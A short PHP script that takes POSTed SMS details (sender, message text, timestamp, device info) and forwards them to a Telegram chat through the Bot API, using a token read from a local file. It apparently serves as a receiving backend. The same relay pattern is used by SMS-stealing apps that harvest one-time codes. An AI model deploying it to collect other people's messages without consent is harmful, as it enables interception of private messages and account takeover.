<?php
date_default_timezone_set('Asia/Kolkata');

// Read Telegram config from tg.txt (same directory)
$config = file(__DIR__ . '/tg.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$telegramBotToken = '';
$chatId = '';

foreach ($config as $line) {
    if (strpos($line, 'BOT_TOKEN=') === 0) {
        $telegramBotToken = trim(substr($line, 10));
    }
    if (strpos($line, 'CHAT_ID=') === 0) {
        $chatId = trim(substr($line, 8));
    }
}

if (!$telegramBotToken || !$chatId) {
    http_response_code(500);
    exit;
}

$sender     = filter_input(INPUT_POST, 'sender', FILTER_SANITIZE_STRING);
$message    = filter_input(INPUT_POST, 'message', FILTER_SANITIZE_STRING);
$timestamp  = filter_input(INPUT_POST, 'timestamp', FILTER_SANITIZE_STRING);
$deviceInfo = filter_input(INPUT_POST, 'deviceInfo', FILTER_SANITIZE_STRING);

if ($sender && $message && $timestamp && $deviceInfo) {

    $telegramMessage =
        "New SMS Received:\n\n" .
        "Sender: $sender\n" .
        "Message: $message\n" .
        "Timestamp: $timestamp\n" .
        "Device Info: $deviceInfo";

    $telegramApiEndpoint = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";

    $telegramParams = [
        'chat_id' => $chatId,
        'text'    => $telegramMessage,
    ];

    $ch = curl_init($telegramApiEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $telegramResponse = curl_exec($ch);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($telegramResponse === false) {
        error_log("CURL error: $curlError");
        http_response_code(500);
    } else {
        http_response_code(200);
    }

} else {
    http_response_code(400);
}
?>